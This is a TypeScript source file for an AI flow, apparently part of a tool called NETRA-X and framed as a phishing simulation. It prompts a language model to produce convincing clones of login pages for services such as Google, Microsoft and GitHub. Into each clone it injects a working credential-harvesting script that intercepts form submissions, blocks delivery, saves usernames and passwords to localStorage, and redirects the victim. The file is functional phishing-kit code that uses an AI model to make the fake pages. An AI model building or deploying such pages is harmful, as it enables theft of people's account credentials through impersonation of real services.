
'use server';
/**
 * @fileOverview An AI flow for simulating the cloning of a web page for phishing simulations.
 *
 * - cloneLoginPage - Generates realistic HTML for a login page and injects a credential harvester.
 * - PageClonerInput - The input type for the cloneLoginPage function.
 * - PageClonerOutput - The return type for the cloneLoginPage function.
 */

import {z} from 'zod';
import { ai } from '@/ai/genkit';

const PageClonerInputSchema = z.object({
  targetUrl: z.string().url('A valid target URL is required.'),
  redirectUrl: z.string().url('A valid URL to redirect to after submission is required.'),
});
export type PageClonerInput = z.infer<typeof PageClonerInputSchema>;

const PageClonerOutputSchema = z.object({
  htmlContent: z.string().describe('The full HTML content of the generated login page.'),
});
export type PageClonerOutput = z.infer<typeof PageClonerOutputSchema>;


const getHarvesterScript = (redirectUrl: string) => `
<script>
    // This is the main function that captures form data.
    function captureAndRedirect(form) {
        try {
            const formData = new FormData(form);
            const credentials = {};
            let capturedData = false;
            
            for (let [key, value] of formData.entries()) {
                // We only care about non-empty, string-based values.
                if (typeof value === 'string' && value.length > 0) {
                    credentials[key] = value;
                    capturedData = true;
                }
            }
            
            if (capturedData) {
                const entry = {
                    ...credentials,
                    source: window.location.href,
                    timestamp: new Date().toISOString()
                };
                const storageKey = 'netra-captured-credentials';

                // Use a try-catch block for robust localStorage interaction
                try {
                    const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
                    const updatedData = [...existingData, entry];
                    localStorage.setItem(storageKey, JSON.stringify(updatedData));
                } catch(e) {
                    console.error('NETRA-X Harvester: Could not save to localStorage.', e);
                }
            }
        } catch (e) {
            console.error('NETRA-X Harvester: Error capturing form data.', e);
        } finally {
            // Always redirect the user to the intended page.
            // Use a small delay to ensure localStorage has time to save.
            setTimeout(() => {
                window.location.href = '${redirectUrl}';
            }, 150);
        }
    }

    // Attach a submit listener to all forms on the page using event capturing.
    // This ensures our listener runs before any other scripts can stop the event.
    document.addEventListener('submit', function(e) {
        // Prevent the form from actually submitting to its original destination.
        e.preventDefault();
        e.stopPropagation();
        
        // Call our capture function with the submitted form.
        captureAndRedirect(e.target);
    }, true);
</script>
`;

const prompt = ai.definePrompt({
    name: 'loginPageClonerPrompt',
    input: { schema: z.object({ targetUrl: z.string() }) },
    output: { schema: z.object({ htmlContent: z.string() }) },
    prompt: `You are a web page cloner. Your task is to generate a highly realistic, self-contained HTML document that mimics the appearance of a common login page (like Google, Microsoft, GitHub, etc.) based on the target URL provided.

Target URL: {{{targetUrl}}}

Instructions:
1.  **Generate complete, single HTML file structure.** This includes <!DOCTYPE html>, <html>, <head>, and <body>.
2.  **Use Tailwind CSS via CDN.** You MUST include this script in the <head>: \`<script src="https://cdn.tailwindcss.com"></script>\`.
3.  **Create a realistic layout.** The page should have a logo area, a login form with username/password fields, and a submit button. Infer the company from the URL (e.g., 'github.com' -> GitHub).
4.  **Use placeholders for images and logos.** For a logo, use an SVG icon or a placeholder from placehold.co.
5.  **Make it believable.** The text, colors, and layout should closely match the expected style of the inferred service.
6.  The entire output must be a single string in the 'htmlContent' field. Do not include any explanation.
`,
});


export async function cloneLoginPage(input: PageClonerInput): Promise<PageClonerOutput> {
  const { targetUrl, redirectUrl } = PageClonerInputSchema.parse(input);

  try {
    const { output } = await prompt({ targetUrl });
    let html = output!.htmlContent;
    
    // Inject the credential harvester script before the closing body tag
    const script = getHarvesterScript(redirectUrl);
    if (html.includes('</body>')) {
      html = html.replace(/<\/body>/i, `${script}</body>`);
    } else {
      html = html + script;
    }

    return { htmlContent: html };
  } catch (error) {
    console.error('Error cloning page with AI:', error);
    if (error instanceof Error) {
        throw new Error(`Failed to clone page: ${error.message}`);
    }
    throw new Error('An unknown error occurred during AI page cloning.');
  }
}
